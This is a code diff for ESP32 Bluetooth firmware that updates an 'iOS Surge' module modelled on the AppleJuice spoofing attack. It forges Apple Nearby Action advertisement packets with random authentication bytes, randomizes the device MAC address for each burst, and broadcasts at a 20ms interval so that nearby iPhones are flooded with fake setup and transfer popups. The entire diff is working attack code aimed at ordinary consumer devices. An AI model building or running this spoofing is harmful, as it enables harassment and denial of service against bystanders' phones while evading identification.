@@ -6,48 +6,64 @@
 #include <esp_bt_main.h>
 #include <esp_bt_device.h>
 
-// Cyber-Gold Aesthetic Module: iOS 17 Surge
+// Cyber-Gold Aesthetic Module: iOS 18 Surge
 // Based on advanced AppleJuice spoofing with MAC Randomization
 
-static esp_ble_adv_params_t ios17_adv_params = {
-    .adv_int_min        = 0x20,
-    .adv_int_max        = 0x40,
+static esp_ble_adv_params_t ios18_adv_params = {
+    .adv_int_min        = 0x20, // 20ms (Highest frequency)
+    .adv_int_max        = 0x20, // 20ms
     .adv_type           = ADV_TYPE_IND,
     .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
     .channel_map        = ADV_CHNL_ALL,
     .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
 };
 
-// Advanced iOS 17 Payloads
-struct IOS17_Payload {
+// Precision iOS 18 Payloads (Aligned with successful 17-byte structure)
+struct IOS18_Payload {
     const char* name;
-    uint8_t data[31];
-    uint8_t len;
+    uint8_t action;
 };
 
-static IOS17_Payload ios17_targets[] = {
-    {"Vision Pro", {0x02, 0x01, 0x06, 0x1B, 0xFF, 0x4C, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00}, 31},
-    {"Apple TV",  {0x02, 0x01, 0x06, 0x1B, 0xFF, 0x4C, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00}, 31},
-    {"AirPods Max",{0x02, 0x01, 0x06, 0x1B, 0xFF, 0x4C, 0x00, 0x01, 0x1c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00}, 31}
+static IOS18_Payload ios18_targets[] = {
+    {"Surge: Transfer", 0x27},
+    {"Surge: TV Setup", 0x04},
+    {"Surge: Proximity", 0x01}
 };
 
-void ios17_randomize_mac() {
+void ios18_randomize_mac() {
     uint8_t rand_addr[6];
     for (int i = 0; i < 6; i++) rand_addr[i] = random(256);
     rand_addr[0] |= 0xC0; // Set to Static Random Address
     esp_ble_gap_set_rand_addr(rand_addr);
 }
 
-void ios17_surge_start(int target_idx) {
+void ios18_surge_start(int target_idx) {
   #if defined(HAS_BT)
-    ios17_randomize_mac();
-    esp_ble_gap_config_adv_data_raw(ios17_targets[target_idx].data, ios17_targets[target_idx].len);
-    esp_ble_gap_start_advertising(&ios17_adv_params);
-    delay(10);
+    ios18_randomize_mac();
+    uint8_t packet[17];
+    uint8_t i = 0;
+    packet[i++] = 16;          // AD Length
+    packet[i++] = 0xFF;        // Manufacturer Specific
+    packet[i++] = 0x4C;        // Apple Inc.
+    packet[i++] = 0x00;
+    packet[i++] = 0x0F;        // Nearby Action
+    packet[i++] = 0x05;        // Length
+    packet[i++] = 0xC1;        // Action Flags
+    packet[i++] = ios18_targets[target_idx].action; // Action Type
+    esp_fill_random(&packet[i], 3); // Auth Tag
+    i += 3;
+    packet[i++] = 0x00;
+    packet[i++] = 0x00;
+    packet[i++] = 0x10;        // Target Type
+    esp_fill_random(&packet[i], 3); // More randomness
+    
+    esp_ble_gap_config_adv_data_raw(packet, 17);
+    esp_ble_gap_start_advertising(&ios18_adv_params);
+    delay(5);
   #endif
 }
 
-void ios17_surge_stop() {
+void ios18_surge_stop() {
   #if defined(HAS_BT)
     esp_ble_gap_stop_advertising();
   #endif
